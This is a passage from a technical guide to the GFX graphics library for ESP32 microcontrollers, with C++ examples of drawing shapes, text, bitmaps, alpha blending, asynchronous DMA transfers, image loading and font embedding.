throughput is less than the Arduino framework. I'm investigating why this is. I have related issues that are preventing me from supporting certain devices under the ESP-IDF, like the RA8875.\nArduino Framework\nThe Arduino Framework's SPI interop is tightly timed and fast, but doesn't support asynchronous DMA transfers - at least not explicitly - and doesn't seem to have a facility for returning errors during SPI read and write operations. Therefore I think it's less likely for wiring problems to be reported with the Arduino versions of the drivers, but I'm not exactly sure since I haven't tried to create such a scenario to test with. The Arduino framework is more likely to support a device than the ESP-IDF due to differences in the SPI communication API characteristics and behavior. XXXX_async methods will always be performed synchronously with the Arduino framework.\nUsing the GFX API\nInclude gfx.hpp (C++17) or gfx_cpp14.hpp (C++14) to access GFX. Including both will choose whichever is first, so don't include both. Pick which one you need depending on the C++ standard you are targeting.\nFor the ESP-IDF toolchain under platform IO I've only been able to get it to target up to C++14. The gcc compiler they use under Windows isn't new enough to support the newer standard. The C++17 version is slightly more efficient in terms of how the predefined colors function, and might actually be more efficient due to more constexpr resolution. Still, there's not any difference in actually using them.\nUse namespace gfx to access GFX.\nHeaders\nIt is not necessary to explicitly include any of these, though if you're writing driver code you can include a subset to reduce compile times a little.\ngfx_core.hpp - access to basic common types like gfx_result.\ngfx_pixel.hpp - access to the pixel<> type template.\ngfx_positioning.hpp - access to point, size, rect and path types and templates.\ngfx_bitmap.hpp - access to the bitmap<> type template.\ngfx_drawing.hpp - access to draw, the main facilities of GFX.\ngfx_color.hpp - access to the predefined colors through the color<> template, for C++17 or better compilers.\ngfx_color_cpp14.hpp - access to the predefined colors through the color<> template, for C++14 compilers.\ngfx_image.hpp - access to jpeg_image used for loading JPEG images.\ngfx_palette.hpp - access palette support type.\nGFX was designed using generic programming, which isn't common for code that targets little MCUs, but here it provides a number of benefits without many downsides, due to the way it's orchestrated.\nFor starters, nothing is binary coupled. You don't inherit from anything. If you tell GFX you support a method, all you need to do is implement that method. If you do not, a compile error will occur when GFX tries to use it.\nThe advantage of this is that methods can be inlined, templatized, and otherwise massaged in a way that simply cannot be done with a binary interface. They also don't require indirection in order to call them. The disadvantage is if that method never gets used, the compiler will never check the code in it beyond parsing it, but the only way that happens is if you implement methods that you then do not tell GFX you implemented, like asynchronous operations.\nIn a typical use of GFX, you will begin by declaring your types. Since everything is a template basically, you need to instantiate concrete types out of them before you can start to use them. The using keyword is great for this and I recommend it over typedef since it's templatizable and at least in my opinion, it's more readable.\nYou'll often need one for the driver, one for any type of bitmap you wish to declare (you'll need different types for bitmaps with different color models or bit depths, like RGB versus monochrome). Once you do that, you'll want one for the color template, for each pixel type. At the very least, you'll want one that matches the pixel_type of your display device, such as using using lcd_color = gfx::color<typename lcd_type::pixel_type>; which will let you refer to things like lcd_color::antique_white.\nOnce you've done that, almost everything else is handled using the gfx:draw class. Despite each function on the class declaring one or more template parameters, the corresponding arguments are inferred from the arguments passed to the function itself, so you should never need to use <> explicitly with draw. Using draw, you can draw text, bitmaps, lines and simple shapes.\nBeyond that, you can also declare fonts, and bitmaps. These use resources while held around, and can be passed as arguments to draw::text<>() and draw::bitmap<>() respectively.\nImages do not use resources directly except for some bookkeeping during loading. They are not loaded into memory and held around, but rather the caller is called back with small bitmaps that contain portions of the image which can then be drawn to any draw destination, like a display or another bitmap. This progressive loading is necessary since realistically, most machines GFX is designed for do not have the RAM to load a real world image all at once.\nSome Basics\nLet's dive into some code. The following draws a classic effect around the four edges of the screen in four different colors, with \"ESP32 GFX Demo\" in the center of the screen:\nC++\ndraw::filled_rectangle(lcd,(srect16)lcd.bounds(),lcd_color::white);\nconst font& f = Bm437_ATI_9x16_FON;\nconst char* text = \"ESP32 GFX Demo\";\nsrect16 text_rect = f.measure_text((ssize16)lcd.dimensions(),\ntext).bounds();\ndraw::text(lcd,text_rect.center((srect16)lcd.bounds()),text,f,lcd_color::dark_blue);\nfor(int i = 1;i<100;++i) {\n// calculate our extents\nsrect16 r(i*(lcd_type::width/100.0),\ni*(lcd_type::height/100.0),\nlcd_type::width-i*(lcd_type::width/100.0)-1,\nlcd_type::height-i*(lcd_type::height/100.0)-1);\n// draw the four lines\ndraw::line(lcd,srect16(0,r.y1,r.x1,lcd_type::height-1),lcd_color::light_blue);\ndraw::line(lcd,srect16(r.x2,0,lcd_type::width-1,r.y2),lcd_color::hot_pink);\ndraw::line(lcd,srect16(0,r.y2,r.x1,0),lcd_color::pale_green);\ndraw::line(lcd,srect16(lcd_type::width-1,r.y1,r.x2,lcd_type::height-1),lcd_color::yellow);\n// the ESP32 wdt will get tickled\n// unless we do this:\nvTaskDelay(1);\n}\nThe first thing is the screen gets filled with white by drawing a white rectangle over the entire screen. Note that draw sources and targets report their bounds as unsigned rectangles, but draw typically takes signed rectangles. That's nothing an explicit cast can't solve, and we do that as we need above.\nAfter that, we declare a reference to a font we included as a header file. The header file was generated from a old Windows 3.1 .FON file using the fontgen tool that ships with GFX. GFX can also load them into memory from a stream like a file rather than embedding them in the binary as a header. Each has advantages and disadvantages. The header is less flexible, but allows you to store the font as program memory rather than keeping it on the heap.\nNow we declare a string literal to display, which isn't exciting, followed by something a little more interesting. We're measuring the text we're about to display so that we can center it. Keep in mind that measuring text requires an initial ssize16 that indicates the total area the font has to work with, which allows for things like wrapping text that gets too long. Essentially measure text takes this size and returns a size that is shrunk down to the minimum required to hold the text at the given font. We then get the bounds() of the returned size to give us a bounding rectangle. Note that we call center() on this rectangle when we go to draw::text<>().\nAfter that, we draw 396 lines in total, around the edges of the display, such as to create a moire effect around the edges of the screen. Each set of lines is anchored to its own corner and drawn in its own color.\nCompare the performance of line drawing with GFX to other libraries. You'll be pleasantly surprised. The further from 45 degrees (or otherwise perfectly diagonal) a line is, the faster it draws - at least on most devices - with horizontal and vertical lines being the fastest.\nDouble Buffering, Suspend and Resume\nLet's try it again - or at least something similar - this time using double buffering on a supporting target, like an SSD1306 display. Note that suspend<>() and resume<>() can be called regardless of the draw destination, but they will report gfx::gfx_result::not_supported on targets that are not double buffered. You don't have to care that much about that, because the draws will still work, unbuffered. Anyway, here's the code:\nC++\ndraw::filled_rectangle(lcd,(srect16)lcd.bounds(),lcd_color::black);\nconst font& f = Bm437_Acer_VGA_8x8_FON;\nconst char* text = \"ESP32 GFX\";\nsrect16 text_rect = srect16(spoint16(0,0),\nf.measure_text((ssize16)lcd.dimensions(),\ntext));\ndraw::text(lcd,text_rect.center((srect16)lcd.bounds()),text,f,lcd_color::white);\nfor(int i = 1;i<100;i+=10) {\ndraw::suspend(lcd);\n// calculate our extents\nsrect16 r(i*(lcd_type::width/100.0),\ni*(lcd_type::height/100.0),\nlcd_type::width-i*(lcd_type::width/100.0)-1,\nlcd_type::height-i*(lcd_type::height/100.0)-1);\ndraw::line(lcd,srect16(0,r.y1,r.x1,lcd_type::height-1),lcd_color::white);\ndraw::line(lcd,srect16(r.x2,0,lcd_type::width-1,r.y2),lcd_color::white);\ndraw::line(lcd,srect16(0,r.y2,r.x1,0),lcd_color::white);\ndraw::line(lcd,srect16(lcd_type::width-1,r.y1,r.x2,lcd_type::height-1),lcd_color::white);\ndraw::resume(lcd);\nvTaskDelay(1);\n}\nOther than some minor differences, mostly because we're working with a much smaller display that is monochrome, it's the same code as before with one major difference - the presence of suspend<>() and resume<>() calls. Once suspend is called, further draws aren't displayed until resume is called. The calls should balance, such that to resume a display you must call resume the same number of times that you call suspend. This allows you to have subroutines which suspend and resume their own draws without messing up your code. GFX in fact, uses suspend and resume on supporting devices as it draws individual elements. The main reason you have it is so you can extend the scope across several drawing operations.\nA Note About Suspend/Resume and E-Ink/E-Paper Displays\nThe refresh rate of this class of displays is extremely slow. However, GFX does not distinguish between e-paper displays and traditional TFT/LCD/OLED displays in terms of how it uses them. Therefore, in order to achieve reasonable performance, it's important to suspend and resume entire frames at a time. Animation is out of the question for these displays. Some of these displays support partial updating which in theory will improve their refresh rates. However, the displays are not well documented and I haven't been successful in getting that to work yet.\nLet's Do Polygons\nSince adding polygon support, I suppose an example of that will be helpful. Here it is in practice:\nC++\n// draw a polygon (a triangle in this case)\n// find the origin:\nconst spoint16 porg = srect16(0,0,31,31)\n.center_horizontal((srect16)lcd.bounds())\n.offset(0,\nlcd.dimensions().height-32)\n.top_left();\n// draw a 32x32 triangle by creating a path\nspoint16 path_points[] = {spoint16(0,31),spoint16(15,0),spoint16(31,31)};\nspath16 path(3,path_points);\n// offset it so it starts at the origin\npath.offset_inplace(porg.x,porg.y);\n// draw it\ndraw::filled_polygon(lcd,path,lcd_color::coral);\nThis will draw a small triangle horizontally centered at the bottom of the screen. The most difficult bit was finding the origin, but even that's not hard, if you break down the creation of porg call by call.\nA Pixel For Any Situation\nYou can define pixels by using the pixel<> template, which takes one or more channel_traits<> as arguments, themselves taking a name, a bit depth, and optional minimum, maximum, default value, and scale. The channel names are predefined, and combinations of channel names make up known color models. Known color models are models that can be converted to and from an RGB color model, essentially. Currently they include RGB, Y'UV, YbCbCr, and grayscale. Declare pixels in order to create bitmaps in different formats or to declare color pixels for use with your particular display driver's native format. In the rare case you need to define one manually, you can do something like this:\nC++\n// declare a 16-bit RGB pixel\nusing rgb565 = pixel<channel_traits<channel_name::R,5>,\nchannel_traits<channel_name::G,6>,\nchannel_traits<channel_name::B,5>>;\nThat declares a pixel with 3 channels, each of uint8_t: R:5, G:6, and B:5. Note that after the colon is how many effective bits it has. The uint8_t type is only for representing each pixel channel in value space in your code. In binary space, like laid out in an in memory bitmap, the pixel takes 16 bits, not 24. This defines a standard 16-bit pixel you typically find on color display adapters for IoT platforms. RGB is one of the known color models so there is a shorthand for declaring an RGB pixel type of any bit depth:\nC++\nusing rgb565 = rgb_pixel<16>; // declare a 16-bit RGB pixel\nThis will divide the bits evenly among the channels, with remaining bits going on the green channel. It is shorthand for the longhand declaration given initially and it resolves to that.\nPixels are mainly used to represent colors, and to define the binary layout of a bitmap or framebuffer. A bitmap is a template that is typed by its pixel type. Ergo, bitmaps with different pixel types are different types themselves.\nThe pixels have a rich API which allow you to read and write individual channels by name or index, and get a dizzying array of metadata about the pixels which you should hopefully never need.\nMost of the time you'll just need to read pixel values from a draw source, or get them from a standard color value. However, sometimes you may need to set the pixel colors yourself.\nEach pixel is composed of the channels you declared, and the channels may be accessed by \"name\" (channel_name enumeration) or by index. The values can be retrieved or set using channel<>() accessors for the native integer value and channelr<>() for real/floating point values scaled to between zero and one. Often times you need to set or get the channel programmatically based on some other compile time constant and the compiler will complain because it can't verify that the channel actually exists. In order to avoid this you can use channel_unchecked<>() which accesses the channel without compile time verification. If the channel does not exist, setting and getting does nothing. If you need to translate between real and integer values for a channel you can use the channel's ::scale and ::scaler values.\nC++\n// declare a 24-bit rgb pixel\nrgb_pixel<24> rgb888;\n// set channel by index\nrgb888.channel<0>(255); // max\n// set channel by name\nrgb888.channel<channel_name::G>(127);\n// set channel real value\nrgb888.channelr<2>(1.0); // max\n// get red as an int type\nuint8_t r = rgb888.channel<channel_name::R>();\n// get green as a real type\nfloat g = rgb888.channelr<channel_name::G>();\n// get blue as an int type\nuint8_t b = rgb888.channel<channel_name::B>();\n// get the pixel value in big endian form\nuint32_t v = rgb888.value();\nIn addition to this, there is a battery of standard color definitions provided when you include the main gfx header.\nThese are accessed through the color<> template which provides a psuedo-enum of dozens of colors in any pixel format you specify - as the template argument. Even if you retrieve hot_pink as a monochrome or grayscale pixel, it will do the conversion for you, or I should say the compiler will (at least with C++17, I haven't checked the asm output with 14).\nUsing the Alpha Channel\nPixels that have channel_name::A are said to have an alpha channel. In this case, the color can be semi-transparent. Internally the color will be blended with the background color when it is drawn, as long as the destination can support reading, or otherwise supports alpha blending natively (as in its pixel_format has an alpha channel). Draw destinations that do not support it will not respect the alpha channel and will not blend. Any draw method can take pixel colors with an alpha channel present. This is a powerful way to do color blending, but the tradeoff is a significant decrease in performance in most cases due to having to draw pixel by pixel to apply blending. The rgba_pixel<> template will create an RGB pixel with an alpha channel.\nHere's an example of using it in the wild:\nC++\nusing bmpa_type = rgba_pixel<32>;\nusing bmpa_color = color<bmpa_type>;\n// do some alpha blended rectangles\nbmpa_type col = bmpa_color::yellow;\ncol.channelr<channel_name::A>(.5);\ncol = bmpa_color::red;\ncol.channelr<channel_name::A>(.5);\ndraw::filled_rectangle(bmp,\nsrect16(\nspoint16(0,0),\nssize16(\nbmp.dimensions().width,\nbmp.dimensions().height/4)),\ncol);\ncol = bmpa_color::blue;\ncol.channelr<channel_name::A>(.5);\ndraw::filled_rectangle(bmp,\nsrect16(\nspoint16(0,0),\nssize16(\nbmp.dimensions().width/4,\nbmp.dimensions().height)),\ncol);\ncol = bmpa_color::green;\ncol.channelr<channel_name::A>(.5);\ndraw::filled_rectangle(bmp,\nsrect16(\nspoint16(0,\nbmp.dimensions().height-\nbmp.dimensions().height/4),\nssize16(bmp.dimensions().width,\nbmp.dimensions().height/4)),\ncol);\ncol = bmpa_color::purple;\ncol.channelr<channel_name::A>(.5);\ndraw::filled_rectangle(bmp,\nsrect16(\nspoint16(bmp.dimensions().width\n-bmp.dimensions().width/4,\n0),\nssize16(bmp.dimensions().width/4,\nbmp.dimensions().height)),\ncol);\nForgive the formatting. It's the best I could do to avoid even worse line breaks. Basically what we're doing here is creating colors from pixels with an alpha channel, and then setting the alpha channel to half, before drawing a filled rectangle over whatever was already there on the bitmap, blending the colors. The ILI9341 demo has an example of this. The others do not due to screen size constraints.\nRuminating on Rectangles\nWe've been using rectangles above a lot. As I've said, you have signed and unsigned rectangles, but you can convert between them with a cast. They also have an arsenal of manipulation methods on them. While rectangles themselves are mutable, these functions do not modify the rectangle, but rather they return a new rectangle, so for example, if you offset() a rectangle, a new rectangle is returned from the function. That said, there are XXXX_inplace() counterparts for some of these that modify the existing rectangle.\nSome functions that take a destination rectangle will use it as a hint about the orientation of what it is going to draw. draw::arc<>() is one such method. draw::bitmap<>() is another. You can use the flip_XXXX() methods to change the orientation of a rectangle, and the orientation() accessor to retrieve the orientation as flags. Most drawing operations - even lines and ellipses - use rectangles as their input parameters due to their flexibility. Get used to using them, as there's a lot of functionality packed into that two coordinate structure.\nPlotting a Course with Paths\nPaths are simply a series of points, but they get interesting in terms of what we can do with them. We can find the bounding rectangle of a series of points, and determine if something intersects it, whether it represents a simple line segment series, or a polygon. You supply the buffer, for efficiency's sake, but then types like spath16 wrap it with an API that allows for offsetting*, intersection determination, and bounding.\n* offsets are only supported in-place due to overhead of allocating a copy of a path, which I want to avoid doing casually.\nBitmaps, Bitmaps and More Bitmaps\nIt can help to think of a bitmap as a variable that holds pixel data.\nIt's basically an in memory draw source and draw destination.\nIn isolation, it's not very useful except to hold pixels around in a format suitable for use in a frame buffer, but because its data is efficiently transferable to display devices and other bitmaps, it becomes an extremely utilitarian feature of GFX.\nAt its simplest, it's basically an array of pixels, with a width and height associated with it, but that's not strictly true. Not all pixels are multiples of 8-bits wide, much less an even machine word size. Frame buffers may not be aligned on byte boundaries. For example, if you have an 18-bit pixel, that means there's a new pixel every 18-bits in the bitmap memory. Because of that, there's no necessarily easy way to access a bitmap as raw memory depending on the pixel format, but bitmaps provide ways to get and set the data therein.\nBitmaps do not hold their own buffers. They're basically a wrapper around a buffer you declare that turns it into a draw source/draw destination. The reason they don't hold their own buffers is because not all memory is created equal. You have stack, and then you have possibly multiple types of heap, including heap that cannot be used to do DMA transfers, like the external 4MB of PSRAM on an ESP32 WROVER.\nI like to declare my fixed size bitmap buffers in the global scope (under a namespace if I don't want pollution) because that way they don't get put on the stack, and I don't have to manage heap. Plus allocating early means less potential for fragmentation later. I know people frown on globals, and I understand why, but on these little devices, they're useful in certain situations. I feel this is one of them, but your mileage may vary.\nAnyway, first we have to declare our buffer. I was very careful to make my objects constexpr enabled so you could do things like the following:\nC++\nusing bmp_type = bitmap<rgb_pixel<16>>;\n// the following is for convenience:\nusing bmp_color = color<typename bmp_type::pixel_type>; // needs GFX color header\nfollowed by:\nC++\nconstexpr static const size16 bmp_size(16,16);\nuint8_t bmp_buf[bmp_type::sizeof_buffer(bmp_size)];\nTo be honest, the first time I wrote code like that, I was surprised it compiled. The modern C++ compiler is a truly wonderful thing. Back in the bad old days, I used to get so frustrated that C and C++ refused to allow you to put array size declarations behind a function call, regardless of how trivial the function was. I knew why, but it didn't make me less frustrated knowing that. The expression sizeof_buffer() computes is (width*height*bit_depth+7)/8. That returns the minimum number of whole bytes required to store your bitmap data at that size and color resolution.\nNow that we have all that, wrapping it with a bitmap is trivial:\nC++\nbmp_type bmp(bmp_size,bmp_buf);\n// you'll probably want to do this, but not necessary if\n// you're redrawing the entire bmp anyway:\nbmp.clear(bmp.bounds()); // zero the bmp memory\n``` C++\nNow you can call `draw` methods passing `bmp` as the destination:\nC++\n``` C++\n// draw a happy face\n// bounding info for the face\n// change the line below if you want a subregion\nsrect16 bounds=(srect16)bmp.bounds();\nrect16 ubounds=(rect16)bounds;\n// draw the face\ndraw::filled_ellipse(bmp,bounds,bmp_color::yellow);\n// draw the left eye\nsrect16 eye_bounds_left(spoint16(bounds.width()/5,\nbounds.height()/5),\nssize16(bounds.width()/5,\nbounds.height()/3));\ndraw::filled_ellipse(bmp,eye_bounds_left,bmp_color::black);\n// draw the right eye\nsrect16 eye_bounds_right(\nspoint16(\nbmp_size.width-eye_bounds_left.x1-eye_bounds_left.width(),\neye_bounds_left.y1\n),eye_bounds_left.dimensions());\ndraw::filled_ellipse(bmp,eye_bounds_right,bmp_color::black);\n// draw the mouth\nsrect16 mouth_bounds=bounds.inflate(-bounds.width()/7,\n-bounds.height()/8).normalize();\n// we need to clip part of the circle we'll be drawing\nsrect16 mouth_clip(mouth_bounds.x1,\nmouth_bounds.y1+mouth_bounds.height()/(float)1.6,\nmouth_bounds.x2,\nmouth_bounds.y2);\ndraw::ellipse(bmp,mouth_bounds,bmp_color::black,&mouth_clip);\nNow you can take that bitmap and draw::bitmap<>() to your display or to another bitmap, or really any draw destination. You can even draw from a bitmap (or other draw source) to itself as long as the effective source and destination rectangles do not overlap. If they do, the data will probably get corrupted.\nSo now this bmp is essentially a variable that refers to a draw target which currently holds a happy face. Neat.\nThe individual members of the bitmap<> template class are not that important. The important thing is that a bitmap is both a draw source, and a draw destination, so it can be used with draw functions.\nLarge Bitmaps\nOn little devices there's not a lot of heap, and while it may seem like you should be able to load a 160kB frame buffer on a 512kB system, there's the inconvenient little issue of heap fragmentation. Heap fragmentation causes there to not be 160kB of contiguous free space anywhere on the heap in many situations because of past deallocations, even if it's the first allocation you make after the RTOS passes you control because the heap is already \"dirty\" and fragmented by then. What do we do?\nIn GFX large bitmaps can created using the large_bitmap<> template class. It is a composition of a lot of smaller bitmaps such that it presents a facade of one unified draw source/destination. Using this is pretty much the same as the regular bitmap as far as GFX is concerned, even though it doesn't have all the fancy members that bitmaps do. I'll be adding to and optimizing the large bitmap API as I go, but I wanted to get it out there.\nCreate it like a normal bitmap except you need to pass in the segment height, in lines as the second parameter. A large bitmap is composed of a bunch of smaller bitmaps (referred to as segments) of the same width stacked vertically. Therefore, each segment is a number of lines high. Every segment but the last one (which may be smaller) has the same number of lines. Unlike normal bitmaps, you do not allocate your own memory for this but you can use custom allocator and deallocator functions if you need special platform specific heap options. It's not worth getting into code, because using it is no different than using a regular bitmap, sans some features which GFX will work around the lack of.\nViewports\nViewports allow you to create a virtual canvas over a draw destination that can be rotated or offset. They are used pretty simply, although rotation can be tricky because you have to get your rotation center correct to get the results you expect:\nC++\nviewport<bmp_type> view(bmp);\nview.rotation(90);\nview.offset({45,5});\n// now draw\nsrect16 sr = view.translate(textsz.bounds());\nsr = sr.clamp_top_left_to_at_least_zero();\ndraw::text(view, sr, {0,0}, text, fnt, sc, color_max::white);\nI've omitted some of the code, but basically what we've done here is create a viewport<> over a bitmap, set its rotation to 90 degrees. Then we offset it some so that we don't clip the text we're about to draw, translate the text bounds so we have a proper destination rect, and finally, draw to the viewport. All draw operations will be rotated 90 degrees around the center, which defaults to (0, 0).\nProperly Using Asynchronous Draws\nEvery drawing method has an asynchronous counterpart. While they do, it's usually not a good idea to use them. There are however, cases where using them can significantly increase your frame rate. The situation in which this is possible is somewhat narrow, but replicable. The key to performance is draw::bitmap_async<>(). This method is DMA-aware for drivers that support it, and will initiate a background DMA transfer by way of a frame write on the driver where available. This is facilitated by a driver's implementation of copy_from_async<>(), but in order to work at maximum efficiency there can be no cropping, resizing, flipping or color conversion of the bitmap in question - otherwise a (mostly) synchronous operation will take place. Additionally, you probably cannot use PSRAM for these transfers - you are limited to RAM that is available to use for DMA. Finally the bitmap actually has to be large enough to make it worthwhile.\nWhat size is worthwhile? It depends. The idea is you want to be sending part of your frame to be drawn in the background while you're rendering the next part of the frame. In order for that to work, you'll have to kind of tune the size of the bitmap you'll be sending, but I find 10kB (320x16x16bpp) at a time or so @ 26MHz is a win. As a rule, more data at a time is better, but takes more RAM.\nThe code looks approximately like this under the ESP-IDF at least:\nC++\nuint16_t *lines[2];\n//Allocate memory for the pixel buffers\nfor (int i=0; i<2; i++) {\nlines[i]=(uint16_t*)heap_caps_malloc(lcd.dimensions().width\n*PARALLEL_LINES*sizeof(uint16_t), MALLOC_CAP_DMA);\nassert(lines[i]!=NULL);\n}\nusing lines_bmp_type = bitmap<typename lcd_type::pixel_type>;\nlines_bmp_type line_bmps[2] {\nlines_bmp_type(size16(lcd.dimensions().width,PARALLEL_LINES),lines[0]),\nlines_bmp_type(size16(lcd.dimensions().width,PARALLEL_LINES),lines[1])\n};\nint frame=0;\n//Indexes of the line currently being sent to the LCD and the line we're calculating.\nint sending_line=-1;\nint calc_line=0;\n// set up lines[] with data here...\n++frame;\nfor (int y=0; y<lcd.dimensions().height; y+=PARALLEL_LINES) {\n//Calculate some lines\ndo_line_effects(line_bmps[calc_line], y, frame, PARALLEL_LINES);\n// wait for the last frame to finish. Don't need this unless transactions are > 7\nif(-1!=sending_line)\ndraw::wait_all_async(lcd);\n//Swap sending_line and calc_line\nsending_line=calc_line;\ncalc_line=(calc_line==1)?0:1;\n//Send the lines we currently calculated.\n// draw::bitmap_async works better the larger the transfer size. Here ours is pretty big\nconst lines_bmp_type& sending_bmp = line_bmps[sending_line];\nrect16 src_bounds = sending_bmp.bounds();\ndraw::bitmap_async(lcd,(srect16)src_bounds.offset(0,y),sending_bmp,src_bounds);\n//The lines set is queued up for sending now; the actual sending happens in the\n//background. We can go on to calculate the next lines set as long as we do not\n//touch lines[sending_line] or the bitmap for it;\n// the SPI sending process is still reading from that.\n}\nThe basic idea here is as I said, we have two bitmaps, and we draw to one, here with do_line_effects() - the idea being that it fills the current frame (indicated by calc_frame) with some pretty colors. Then we make sure to wait for any pending operations to complete. The reason being is that we're about to start writing to the other line_bmps[] bitmap now and we need to make sure it's not still being read from in the background. The first time through as indicated by sending_line==-1, we skip this wait step because we weren't sending anything yet.\nNext we swap out the index of our bitmaps, so like I said, we'll be drawing to the other one now. Then we simply get its bounds and pass it as well as the first bitmap to draw::bitmap_async<>(), and it goes full metal DMA on your hardware (assuming your hardware is capable), doing it in the background and freeing the loop here to continue almost immediately after the call so we can start drawing again, rather than waiting for the transfer to complete.\nIt's a little bit complicated, and I'm stewing on some ideas to make it easier to implement this pattern. I'll keep you posted. It should be noted that this technique is not exclusive to GFX, nor did I come up with it. It is in fact, a common rendering technique when you need real time double buffered animation without the memory to hold an entire frame, and also a way to stream in the background in order to animate more efficiently.\nWhat About the Other XXXX_async Methods?\nThese methods aren't as effective. The lack of blocking doesn't make up for the overhead for such small transactions. The main reason to use them is in the rare case where you want to continue to queue drawing operations after draw::bitmap_async<>(). Typically, when you switch from asynchronous to synchronous methods, the driver must wait for all pending asynchronous operations to complete. By continuing the async chain with line_async<>() instead of line<>() for example, you can prevent it from forcing a wait for the bitmap data to complete, at the cost of some extra CPU overhead.\nLoading Images\nThere are two ways to get an image from a JPG stream (other formats are coming). Both require creating a stream over the input, like a file, and then using it with one of two methods:\nThe first, and easiest method is to use draw::image<>() which allows you to position the image on the destination and crop a portion of the image. There is an option for resizing but it's not currently supported. It's actually really difficult to do progressively so I'm not sure when it will be. Currently if you try to pass something other than bitmap_resize::crop it will return gfx_result::not_supported. Also currently the destination rect's orientation is ignored, so flipping isn't possible. This will be updated when I can manage it - I've got a lot to juggle.\nBelow lcd represents our target on which to draw the image:\nC++\nfile_stream fs(\"/spiffs/image.jpg\");\n// TODO: check caps().read to see if the file is opened/readable\ndraw::image(lcd,(srect16)lcd.bounds(),&fs,rect16(0,0,-1,-1));\nNote above since we don't know the size of the bitmap we can pass 0xFFFF or -1 for the extents and the source rectangle extents will end up based on the image size since the source rectangle is cropped to fit the image.\nThe second way of loading an image is passing the stream to an image loader function along with a callback (I prefer to use an anonymous method/lambda for this) that handles the progressive loading. You'll be called back multiple times, each time with a portion of the image as a bitmap, along with a location where it belongs within the image, and any state you passed along to the load function. Note that to reduce overhead, a state variable is used to pass state instead of using a functor like std::function. You can use a \"flat\" lambda that decays to a simple function pointer, and then pass your class pointer in as the state argument, to be reconstituted inside your callback. Often times, you won't even need a state argument because everything you're after, such as the display itself, is available globally:\nC++\nfile_stream fs(\"/spiffs/image.jpg\");\n// TODO: check caps().read to see if the file is opened/readable\njpeg_image::load(&fs,[](size16 dimensions,\ntypename jpeg_image::region_type& region,\npoint16 location,\nvoid* state){\nreturn draw::bitmap(lcd, // lcd is available globally\nsrect16((spoint16)location,\n(ssize16)region.dimensions()),\nregion,region.bounds());\n},nullptr);\nLoading (or Embedding) Fonts\nFonts can be used with draw::text<>() and can either be loaded from a stream, similar to images, or they can be embedded into the binary by generating a C++ header file for them. Which way you choose depends on what you need and what you're willing to give up. With IoT, everything is a matter of robbing Peter to pay Paul.\nAnyway, you'll usually want to go with the embedded fonts, unless you intend for the fonts to be able to be loaded and unloaded at runtime for some reason, or program space is at more of a premium than say, SPIFFs and RAM, or if you want to be able to load .FON or .TTF files from an SD card for example.\nSpeaking of .FON files, they are an old (primarily) raster font format from the Windows 3.1 days. Given those were 16-bit systems, the .FON files were to the point, with little extra overhead and were designed to be read quickly. Furthermore while being old, at least they aren't a completely proprietary format. It is possible to hunt them down online, or even make your own. For these devices, .FON files are a nearly ideal format, which is why they were chosen here. With IoT, everything old is new again.\nYou can also use .TTF files, which are more flexible, nicer, modern fonts, but you pay a significant penalty in terms of performance and complexity.\nYou can use the fontgen tool to create header files from font files. Simply include these to embed them and then reference the font in your code. The font is a global variable with the same name as the file, including the extension, with illegal identifier characters turned into underscores.\nLet's talk about the first method - embedding:\nFirst, generate a header file from a font file using fontgen under the tools folder of the GFX library:\nShell\n~$ fontgen myfont.fon > myfont.hpp\nor\nShell\nC:\\> fontgen myfont.ttf > myfont.hpp\nNote with Windows, it might try to spit it out in UTF-16 which will mangle your header file to death. If that happens, open the header in notepad, and resave it as ASCII or UTF-8. Also note in the fontgen source there is a #define WINDOWS which should be set on the Windows platform.\nNow you can include that in your code:\nC++\n#include \"myfont.hpp\"\nThis allows you to reference the font like this:\nRaster Fonts\nC++\nconst font& f = myfont_fon;\nconst char* text = \"Hello world!\";\nsrect16 text_rect = f.measure_text((ssize16)lcd.dimensions(),\ntext).bounds();\ndraw::text(lcd,\ntext_rect.center((srect16)lcd.bounds()),\ntext,\nf,\nlcd_color::white);\nThe second way to access a font is by loading a .FON file from a stream, which stores the font around on the heap rather than embedded as a static const array in your code is to just replace the first line of code above with this:\nC++\nfile_stream fs(\"/spiffs/myfon.fon\");\nif(!fs.caps().read) {\nprintf(\"Font file not found.\\r\\n\");\nvTaskDelay(portMAX_DELAY);\n}\nfont f(&fs);\nThat will create a font on the heap from the given file. You can then go on to draw it like normal. When it goes out of scope, the heap it used is reclaimed.\nIt is usually more efficient to draw fonts with a solid background than ones with a transparent background, so if raw performance is your ultimate goal, stick with non-transparent font draws.\nTrue Type/Open Type Fonts\nC++\nconst open_font& f=Maziro_ttf;\ndraw::filled_rectangle(lcd,(srect16)lcd.bounds(),lcd_color::white);\nconst char* text = \"ESP32 GFX Demo\";\nfloat scale = f.scale(40);\nsrect16 text_rect = f.measure_text((ssize16)lcd.dimensions(),{5,-7},\ntext,scale).bounds();\ndraw::text(lcd,\ntext_rect.center((srect16)lcd.bounds()),\n{5,-7},\ntext,\nf,\nscale,\nlcd_color::dark_blue);\nNote the addition of the offset and scale parameters compared to raster fonts.\nFiles are the same as loading raster fonts.\nGFX Draw Bindings\nDrivers and other things may be draw destinations and may also be draw sources. In order to work as those things, the custom draw target must expose some members so that GFX can bind to them.\nCommon Members to All Draw Targets\nThe first member is a public using caps = gfx::gfx_caps<...>; alias that will be used to determine what kinds of features your driver supports. If, for example, you indicate batching support, GFX will attempt to call methods like write_batch() on your driver. If you indicate support for a feature without implementing the corresponding methods, that's a compile error:\ncaps - Indicates the capabilities of the target, which consist of these members:\nblt - the target supports accessing its memory as raw data using begin() and its memory must be laid out contiguously from left to right, top to bottom in the corresponding pixel_format.\nasync - the target supports asynchronous versions of its methods. GFX will call the methods suffixed with _async() when asynchronous operations are requested by the caller. If it doesn't support all of them, but rather only some of them, then the implementer should delegate from the unsupported _async() operations to the synchronous ones for the methods where there is no asynchronous counterpart.\nbatch - the target supports batching write operations and is expected to expose begin_batch(), write_batch(), and commit_batch().\ncopy_from - the target supports optimized copying from a draw source, and GFX should use the exposed copy_from<>() template method when possible.\nsuspend - the target supports granular double buffering, wherein drawing operations can be written offscreen when suspend() is called and then a portion of the screen that was updated sent to the display upon resume(). The implementor should keep a count of suspends to balance the calls of suspend with those to resume.\nread - the target supports reading pixel data, which facilitates its use as a draw source and also enables alpha blending.\ncopy_to - the target supports optimized copying to a draw destination and GFX should use the exposed copy_to<>() method when possible. If given the choice between using a draw source's copy_to<>() method and a draw destinations's copy_from<>() method, GFX will choose the copy_from<>() method, since there are more optimization opportunities with that.\nNext, you have to declare the using pixel_type alias on your draw target. This is probably most often an alias for gfx::rgb_pixel<16> 